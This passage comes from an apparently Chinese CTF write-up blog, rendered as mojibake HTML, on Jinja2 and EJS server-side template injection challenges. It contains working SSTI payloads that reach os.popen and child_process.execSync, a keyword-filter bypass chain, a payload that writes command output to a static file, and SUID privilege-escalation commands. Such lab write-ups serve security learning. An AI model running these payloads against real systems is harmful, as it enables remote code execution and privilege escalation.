&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„å·²ç­‰ä»·äº<code>&#123;&#123; (url_for|attr('__globals__'))|attr('__getitem__')(os)|attr('popen')(cmd)|attr('read')() &#125;&#125;</code></p><p>ä¹Ÿç›¸å½“äº<code>&#123;&#123; url_for['__globals__']['__getitem__']('os')['popen'](cmd)['read']() &#125;&#125;</code></p><br/><p>æ­¤æ—¶å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ï¼Œä¼ å…¥payloadå’Œ<code>a=ls /</code>ï¼Œå¯ä»¥çœ‹åˆ°<code>flag</code>æ–‡ä»¶ï¼Œå°è¯•æå–å‘ç°æ— å›æ˜¾ï¼Œå¯èƒ½æ˜¯éœ€è¦<strong>ææƒ</strong>ï¼Œåšé¢˜æ—¶å¯ä»¥ç”¨<code>&#123;&#123; cycler.__init__.__globals__['os'].environ &#125;&#125;</code>æŸ¥çœ‹å…¨å±€å˜é‡ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæç¤º<code>&#39;HINT&#39;: &#39;ç”¨æˆ‘æä¸ªæƒå§&#39;</code>ï¼Œæ¥ä¸‹æ¥æŸ¥æ‰¾ææƒçš„æ–‡ä»¶ï¼Œä¼ å…¥<code>a=find / -user root -perm -4000 -print 2&gt;/dev/null</code>ï¼Œå›æ˜¾</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/usr/bin/su </span><br><span class="line">/usr/bin/gpasswd </span><br><span class="line">/usr/bin/chfn </span><br><span class="line">/usr/bin/chsh </span><br><span class="line">/usr/bin/umount </span><br><span class="line">/usr/bin/newgrp </span><br><span class="line">/usr/bin/passwd </span><br><span class="line">/usr/bin/mount </span><br><span class="line">/usr/local/bin/env</span><br></pre></td></tr></table></figure><p>ç»“åˆåœ¨ç¯å¢ƒå˜é‡è¯»åˆ°çš„hintï¼Œåˆ©ç”¨<code>/usr/local/bin/env</code>è¿›è¡Œææƒï¼Œä¼ å…¥<code>a=/usr/local/bin/env cat /flag</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;D0nt_m@ke_w1sdom_awar3_of_Rules_019aa4645e167e239a74402217bba8d1&#125;</span><br></pre></td></tr></table></figure><br/><h3 id="Aurora-CTF-2025-æˆˆè¾¾å°”çš„å‰§æœ¬å·¥å‚"><a href="#Aurora-CTF-2025-æˆˆè¾¾å°”çš„å‰§æœ¬å·¥å‚" class="headerlink" title="[Aurora CTF 2025]æˆˆè¾¾å°”çš„å‰§æœ¬å·¥å‚"></a>[Aurora CTF 2025]æˆˆè¾¾å°”çš„å‰§æœ¬å·¥å‚</h3><blockquote><p>hint:æœ¬é¢˜åªè€ƒå¯Ÿä¸€ä¸ªæ¼æ´ã€‚èƒ½å›æ˜¾è¾“å…¥çš„å†…å®¹ï¼Œå¯èƒ½è€ƒå¯Ÿä»€ä¹ˆæ¼æ´ï¼Ÿæ ¹æ®æµ‹è¯•ç»“æœå’Œè¢«wafçš„å†…å®¹ç¡®å®šè€ƒå¯Ÿçš„æ¼æ´å§</p><p>hint:è¿™é¢˜ä¸­çš„Aurora{test_flag}æ˜¯å‡çš„flagï¼ŒçœŸçš„flagåœ¨ç¯å¢ƒå˜é‡é‡Œ</p></blockquote><p>è¿™æ˜¯å†…éƒ¨æ–°ç”Ÿèµ›çš„é¢˜ç›®ï¼Œæœ¬é¢˜çš„Base64ç¼–ç è¦æ±‚åº”è¯¥æ˜¯é˜²ç„šé–è®¾è®¡ï¼Œä½†æ–°ç”Ÿèµ›çš„æ—¶å€™è¿˜æ˜¯ç„šé–ä¸€æŠŠæ¢­äº†ï¼ˆä¹ï¼Œç°å†³å®šæ­£å¸¸å¤ç°ä¸€æ¬¡</p><p>å·²ç»çŸ¥é“æ–¹å‘æ˜¯Jinja2æ¨¡æ¿æ³¨å…¥ï¼Œ<code>&#123;&#123;7*7&#125;&#125;</code>ç¼–ç åä¼ å…¥å›æ˜¾49ï¼Œæµ‹è¯•å‡ æ¬¡åå‘ç°è¿‡æ»¤äº†<code>&#39;&#39;</code>ã€<code>&quot;&quot;</code>ã€<code>[]</code>ã€<code>&#123;&#123;&#125;&#125;</code>ã€<code>.</code>å’Œä¸€äº›å…³é”®å­—ï¼ˆå‘ç°<code>class</code>è¢«wafäº†ï¼Œåé¢å…³é”®å­—ç´¢æ€§éƒ½ç»•è¿‡äº†ï¼‰</p><p>å®Œæ•´çš„payloadæ˜¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> cla=<span class="built_in">dict</span>(c=a,l=a,a=a,ss=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> down=(lipsum|string|<span class="built_in">list</span>)|attr(po)(<span class="number">18</span>) %&#125; //ä¸‹åˆ’çº¿</span><br><span class="line">&#123;% <span class="built_in">set</span> clas=(down,down,cla,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bas=(down,down,<span class="built_in">dict</span>(b=<span class="number">0</span>,<span class="keyword">as</span>=<span class="number">0</span>,e=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> sub=(down,down,<span class="built_in">dict</span>(sub=<span class="number">0</span>,cla=<span class="number">0</span>,sse=<span class="number">0</span>,s=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> get=(down,down,<span class="built_in">dict</span>(get=<span class="number">0</span>,ite=<span class="number">0</span>,m=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(down,down,<span class="built_in">dict</span>(ini=<span class="number">0</span>,t=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(down,down,<span class="built_in">dict</span>(glo=<span class="number">0</span>,bal=<span class="number">0</span>,s=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=<span class="number">0</span>,en=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=<span class="number">0</span>,ad=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|string|<span class="built_in">list</span>)|attr(po)(<span class="number">9</span>) %&#125; //ç©ºæ ¼</span><br><span class="line">&#123;% <span class="built_in">set</span> king=()|attr(clas)|attr(bas)|attr(sub)()|attr(get)(<span class="number">134</span>)|attr(ini)|attr(glo)|string|<span class="built_in">list</span>|attr(po)(<span class="number">463</span>) %&#125; //æ–œæ </span><br><span class="line">&#123;% <span class="built_in">set</span> ls=(<span class="built_in">dict</span>(l=<span class="number">0</span>,s=<span class="number">0</span>)|join,a,king)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> env=<span class="built_in">dict</span>(en=<span class="number">0</span>,v=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> d=()|attr(clas)|attr(bas)|attr(sub)()|attr(get)(<span class="number">134</span>)|attr(ini)|attr(glo)|attr(get)(pop)(env)|attr(re)() %&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span> d %&#125;</span><br></pre></td></tr></table></figure><p>çœ‹ç€è™½ç„¶æ¯”è¾ƒå¤æ‚ï¼Œä½†éƒ½æ˜¯æœºæ¢°æ€§çš„æ“ä½œï¼Œè€Œä¸”æ­¤é¢˜ä¸ä¸€å®šè¦åˆ°å‘½ä»¤æ‰§è¡Œé‚£ä¸€æ­¥ï¼Œåªè¦åšåˆ°<code>__globals__</code>å°±å¯ä»¥çœ‹ç¯å¢ƒå˜é‡æ‹¿flagäº†</p><blockquote><p>å¦‚æœè¦åˆ°å‘½ä»¤æ‰§è¡Œï¼Œè°ƒç”¨<code>popen</code>æ—¶ä¸èƒ½ç›´æ¥attrï¼Œå› ä¸ºæˆ‘ä»¬è®¿é—®çš„<code>__globals__</code>æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¦ç”¨<code>__getitem__</code>è¯»å–ï¼Œå‰é¢marinå¸ˆå‚…æ˜¯<code>globals</code>-&gt;<code>os</code>-&gt;<code>popen</code>ï¼Œæ˜¯ä»<code>os</code>æ¨¡å—é‡Œè°ƒç”¨</p></blockquote><br/><h3 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h3><p>æœ‰æ—¶é¢˜ç›®ä¼šä¸å±•ç¤ºä»£ç æ‰§è¡Œç»“æœæˆ–ç›´æ¥ä¸å›æ˜¾ï¼Œè¿™æ—¶çš„å¤„ç†æ–¹æ³•åŒ…æ‹¬ä½†ä¸é™äºå¤–å¸¦ã€åå¼¹shellã€è½¬ç§»æ‰§è¡Œç»“æœã€æ‰“å†…å­˜é©¬,è¿™é‡Œæ¥çœ‹çœ‹æ“ä½œæˆæœ¬è¾ƒä½çš„è½¬ç§»æ‰§è¡Œç»“æœï¼Œå‚è€ƒè‡ª<a href="https://saintcen.github.io/2025/10/13/MoeCTF2025_Web_wp/#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5">MoeCTF2025_Web_wp | Sa1ntCHENã®å°çª</a></p><h3 id="MoeCTF-2025-ç¬¬äºŒåäºŒç« -è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ"><a href="#MoeCTF-2025-ç¬¬äºŒåäºŒç« -è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ" class="headerlink" title="[MoeCTF 2025]ç¬¬äºŒåäºŒç«  è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ"></a>[MoeCTF 2025]ç¬¬äºŒåäºŒç«  è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ</h3><p>é¢˜ç›®ç»™äº†æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_msg = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;Welcome: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">            render_template_string(login_msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œé¡µé¢éƒ½ä¼šç›´æ¥è¿”å›payloadæœ¬èº«ï¼Œè¦è·å–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œè¿™é‡Œå¯ä»¥æ–°å¼€ä¸€ä¸ªæˆ‘ä»¬èƒ½è®¿é—®çš„é¡µé¢ï¼ŒæŠŠæ‰§è¡Œç»“æœå†™å…¥ä¸€ä¸ªæ–‡æœ¬ä¸­ï¼Œpayloadæ˜¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>) <span class="keyword">or</span> url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;builtins&#x27;</span>).<span class="built_in">open</span>(<span class="string">&#x27;static/read.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls /&#x27;</span>).read()) &#125;&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘æ˜¯åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªå­ç›®å½•<code>static</code>ï¼Œå†æ–°å»ºä¸€ä¸ªæ–‡ä»¶<code>read.txt</code>ï¼ŒæŠŠ<code>ls /</code>æ‰§è¡Œçš„ç»“æœå†™å…¥å…¶ä¸­ï¼Œæ‰§è¡Œåè®¿é—®<code>http://127.0.0.1:51581/static/read.txt</code>å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•ä¸‹æœ‰<code>flag</code>æ–‡ä»¶ï¼Œå°è¯•catå¤±è´¥ï¼Œæ¨æµ‹éœ€è¦ææƒï¼Œåˆ©ç”¨<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>æŸ¥æ‰¾å…·æœ‰ç®¡ç†å‘˜æƒé™çš„æ–‡ä»¶</p><blockquote><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>æ‰§è¡Œé€»è¾‘</p><p><code>-user root</code>ï¼šæ–‡ä»¶çš„æ‰€æœ‰è€…å¿…é¡»æ˜¯rootç”¨æˆ·</p><p><code>-perm -4000</code>ï¼šæŸ¥æ‰¾è®¾ç½®äº†SUIDä½çš„æ–‡ä»¶ï¼Œ<code>4000</code> æ˜¯SUIDï¼ˆSet User IDï¼‰çš„å…«è¿›åˆ¶è¡¨ç¤º</p><p><code>-print</code>ï¼šè¾“å‡ºåŒ¹é…æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å</p><p><code>2&gt;/dev/null</code>ï¼šå°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ° <code>/dev/null</code>ï¼Œç›®çš„æ˜¯éšè—æƒé™æ‹’ç»ç­‰é”™è¯¯ä¿¡æ¯</p></blockquote><p>åé¢ç¡®å®š<code>/usr/bin/rev</code>æ˜¯ææƒçš„ç›®æ ‡æ–‡ä»¶ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ç”¨ï¼Œ<a href="https://p111223.github.io/">@mervin</a>è®©æˆ‘å°è¯•<code>ls /usr/bin/rev</code>å¯ä»¥çœ‹åˆ°<code>rev.c</code>ï¼ŒæŸ¥çœ‹åŸç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i + <span class="number">1</span> &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;--HDdss&quot;</span>, argv[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">            execvp(argv[i + <span class="number">1</span>], &amp;argv[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦ä¸€ä¸ª<code>--HDdss</code>æ‰èƒ½æ­£å¸¸ææƒï¼Œåç»­<code>/usr/bin/rev --HDdss cat /flag</code>å°±èƒ½æˆåŠŸææƒæ‹¿flagäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">moectf&#123;5c0b28d8-19dc-1895-0844-fe45f6a3cddf&#125;</span><br></pre></td></tr></table></figure><br/><br/><h2 id="EJSæ¨¡æ¿å¼•æ“-JavaScript-æ³¨å…¥"><a href="#EJSæ¨¡æ¿å¼•æ“-JavaScript-æ³¨å…¥" class="headerlink" title="EJSæ¨¡æ¿å¼•æ“(JavaScript)æ³¨å…¥"></a>EJSæ¨¡æ¿å¼•æ“(JavaScript)æ³¨å…¥</h2><h3 id="æå®¢å¤§æŒ‘æˆ˜2025-Expression"><a href="#æå®¢å¤§æŒ‘æˆ˜2025-Expression" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜2025]Expression"></a>[æå®¢å¤§æŒ‘æˆ˜2025]Expression</h3><blockquote><p>è¿™ä¸ªç¨‹åºå‘˜å·æ‡’ç›´æ¥å¤åˆ¶ç²˜è´´ç½‘ä¸Šçš„ä»£ç è¿ JWT å¯†é’¥éƒ½ä¸æ”¹..ï¼Ÿ</p></blockquote><p>åŸé¢˜è¯´å’Œ<code>JWT</code>æœ‰å…³ï¼Œå¯ä»¥æŠŠå¯†é’¥çˆ†ç ´å‡ºæ¥ï¼Œæ˜¯<code>secret</code>ï¼Œè·å¾—å¯†é’¥åå¯ä»¥ç¯¡æ”¹cookieçš„æ•°æ®ï¼ŒåŸå§‹çš„JWTå¯†é’¥è§£å¯†å‡ºæ¥æœ‰ä¸¤ä¸ªå†…å®¹<code>email</code>å’Œ<code>username</code>ï¼Œå°è¯•å°†<code>username</code>å±æ€§æ”¹ä¸º<code>admin</code>ï¼Œå‘ç°æ²¡ç”¨ï¼Œåé¢çš„å°è¯•æ–¹å‘ä¹Ÿæ˜¯ç®¡ç†å‘˜æƒé™ï¼Œå¯¼è‡´æ–¹å‘ä¸€ç›´éƒ½æ˜¯åçš„ï¼Œå°±å¡åœ¨è¿™é‡Œäº†</p><p>åé¢å¬<a href="https://btop251.vercel.app/">@æ™“å ƒ</a>è¯´æ˜¯ejsæ¨¡æ¿æ³¨å…¥ï¼Œè¦è·å¾—çš„flagåœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œpayloadæ˜¯</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;%- <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;env&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œé€»è¾‘</p><p><code>global.process.mainModule</code> - è·å–Node.jsä¸»æ¨¡å—</p><p><code>require(&#39;child_process&#39;)</code> - åŠ è½½å­è¿›ç¨‹æ¨¡å—</p><p><code>execSync(&#39;env&#39;)</code> - åŒæ­¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<code>env</code>ï¼ˆæ˜¾ç¤ºç¯å¢ƒå˜é‡ï¼‰</p></blockquote><p>æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´è¿™ç©æ„ï¼Œä½†æ¥éƒ½æ¥äº†ä¸å¦¨çœ‹çœ‹æ˜¯æ€ä¹ˆä¸ªæ€è·¯ï¼Œåç«¯æœåŠ¡å™¨æ˜¯nodejså†™çš„ï¼Œæ‹‰å‡ºæ¥çœ‹çœ‹æºç ï¼ˆåšé¢˜çš„æ—¶å€™å•¥ä¹Ÿæ²¡æœ‰ï¼ŒçŒœè°œå®Œäº†</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>; </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">JWT_SECRET</span> = <span class="string">&#x27;secret&#x27;</span>; </span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>(); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;)); </span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>()); </span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>()); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>)); </span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>); </span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/public&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>))); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateServerUsername</span>(<span class="params"></span>)&#123; </span><br><span class="line"><span class="keyword">const</span> suffix = crypto.<span class="title function_">randomBytes</span>(<span class="number">6</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>); </span><br><span class="line"> <span class="keyword">return</span> <span class="string">`user_<span class="subst">$&#123;suffix&#125;</span>`</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">signToken</span>(<span class="params">payload</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> jwt.<span class="title function_">sign</span>(payload, <span class="variable constant_">JWT_SECRET</span>, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="attr">expiresIn</span>: <span class="string">&#x27;7d&#x27;</span> &#125;); &#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireAuth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>; </span><br><span class="line"><span class="keyword">if</span> (!token) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line"><span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;HS256&#x27;</span>] &#125;); </span><br><span class="line">req.<span class="property">user</span> = decoded; <span class="title function_">next</span>(); &#125; </span><br><span class="line"><span class="keyword">catch</span> (e) &#123; </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line"><span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>; </span><br><span class="line"><span class="keyword">let</span> currentUser = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">let</span> renderedUsername; </span><br><span class="line"><span class="keyword">if</span> (token) &#123; </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">currentUser = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>); </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">renderedUsername = ejs.<span class="title function_">render</span>(<span class="title class_">String</span>(currentUser.<span class="property">username</span>), &#123; <span class="attr">user</span>: currentUser, process &#125;);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (e) &#123; </span><br><span class="line">renderedUsername = currentUser.<span class="property">username</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (e) &#123;&#125; </span><br><span class="line">&#125; res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; currentUser, renderedUsername &#125;);&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line"><span class="keyword">const</span> &#123; email &#125; = req.<span class="property">body</span>; </span><br><span class="line"><span class="keyword">if</span> (!email || !<span class="regexp">/^[^@\n]+@[^@\n]+\.[^@\n]+$/</span>.<span class="title function_">test</span>(email))</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid email&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (users.<span class="title function_">has</span>(email)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Email already registered. Please login.&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">const</span> username = <span class="title function_">generateServerUsername</span>(); </span><br><span class="line">users.<span class="title function_">set</span>(email, username);</span><br><span class="line"><span class="keyword">const</span> token = <span class="title function_">signToken</span>(&#123; email, username &#125;); </span><br><span class="line">res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, token, &#123; <span class="attr">httpOnly</span>: <span class="literal">true</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;lax&#x27;</span> &#125;); </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line"><span class="keyword">const</span> &#123; email &#125; = req.<span class="property">body</span>; </span><br><span class="line"><span class="keyword">if</span> (!email || !<span class="regexp">/^[^@\n]+@[^@\n]+\.[^@\n]+$/</span>.<span class="title function_">test</span>(email)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid email&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (!users.<span class="title function_">has</span>(email)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Email not found. Please register first.&#x27;</span>, <span 